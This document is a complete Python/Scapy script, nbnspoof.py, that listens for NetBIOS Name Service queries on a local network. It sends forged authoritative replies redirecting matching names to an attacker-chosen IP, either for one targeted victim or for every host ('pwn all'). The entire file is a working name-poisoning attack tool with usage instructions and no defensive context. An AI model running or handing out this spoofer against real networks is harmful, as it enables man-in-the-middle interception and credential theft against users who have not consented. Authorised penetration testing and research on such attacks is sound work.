#!/usr/bin/env python3
# Fixed and updated for Python 3 / Scapy 2.5+

import sys
import getopt
import re
from scapy.all import *

# Global configuration
config = {
    "verbose": False,
    "regexp": None,
    "ip": None,
    "interface": None,
    "mac_addr": None,
    "victim": None
}

def usage():
    print("""Usage:
nbnspoof.py [-v] -i <interface> -n <regexp> -h <ip address> -m <MAC> [-p <victim_ip>]

-v Verbose output of sniffed NBNS name queries, and responses sent
-i The interface you want to sniff and send on
-n A regular expression applied to query names
-h The IP address that will be sent in spoofed responses
-p (optional) Targeted victim IP address (if unset, pwn all)
-m The source MAC address for spoofed responses
""")

def pack_ip(addr):
    """Converts an IP string to 4 bytes."""
    return socket.inet_aton(addr)

def get_packet(pkt):
    if not pkt.haslayer(NBNSQueryRequest):
        return

    # Check if it's a query (Flags & 0x8000 == 0)
    is_query = not (pkt.getlayer(NBNSQueryRequest).FLAGS & 0x8000)

    # Targeted spoofing check
    if config["victim"] and is_query:
        if pkt.getlayer(IP).src != config["victim"]:
            return
        elif config["verbose"]:
            print(f"[*] Target match: {pkt.getlayer(IP).src}")

    # Process Query
    if is_query:
        # Get the name and decode from bytes to string for regex matching
        q_name = pkt.getlayer(NBNSQueryRequest).QUESTION_NAME.decode('utf-8', 'ignore').strip()
        
        if config["verbose"]:
            print(f"[{pkt.NAME_TRN_ID}] Q SRC:{pkt.getlayer(IP).src} NAME: {q_name}")

        if config["regexp"].search(q_name):
            # Construct Response
            # NBNS responses often need a Raw layer for the specific Resource Record data
            response  = Ether(dst=pkt[Ether].src, src=config["mac_addr"])
            response /= IP(dst=pkt[IP].src, src=config["ip"])
            response /= UDP(sport=137, dport=pkt[UDP].sport)
            
            # Use NBNSQueryRequest as a base but set response flags
            nbns_part = NBNSQueryRequest(
                NAME_TRN_ID=pkt.NAME_TRN_ID,
                FLAGS=0x8500, # Response, Authoritative, Recursion Desired
                QDCOUNT=0,
                ANCOUNT=1,
                NSCOUNT=0,
                ARCOUNT=0,
                QUESTION_NAME=pkt.QUESTION_NAME,
                SUFFIX=pkt.SUFFIX,
                QUESTION_TYPE=pkt.QUESTION_TYPE,
                QUESTION_CLASS=pkt.QUESTION_CLASS
            )
            
            # Construct the Answer section manually via Raw
            # TTL: 3 days (0x000493e0), Data Len: 6, Flags: 0000, IP: xxxx
            answer_data = b'\x00\x04\x93\xe0' + b'\x00\x06' + b'\x00\x00' + pack_ip(config["ip"])
            
            full_pkt = response / nbns_part / Raw(load=answer_data)
            
            sendp(full_pkt, iface=config["interface"], verbose=0)
            
            if config["verbose"]:
                print(f" [+] Sent spoofed reply for {q_name} to {pkt[IP].src}")

def main():
    try:
        opts, args = getopt.getopt(sys.argv[1:], "vi:n:h:m:p:")
    except getopt.GetoptError:
        usage()
        sys.exit(1)

    name_regexp = None
    
    for o, a in opts:
        if o == '-v': config["verbose"] = True
        elif o == '-i': config["interface"] = a
        elif o == '-n': name_regexp = a
        elif o == '-h': config["ip"] = a
        elif o == '-p': config["victim"] = a
        elif o == '-m': config["mac_addr"] = a

    if not config["ip"] or not name_regexp or not config["interface"] or not config["mac_addr"]:
        usage()
        sys.exit(1)

    config["regexp"] = re.compile(name_regexp, re.IGNORECASE)

    print(f"[*] Sniffing on {config['interface']}...")
    sniff(iface=config["interface"], filter="udp and port 137", store=0, prn=get_packet)

if __name__ == "__main__":
    main()
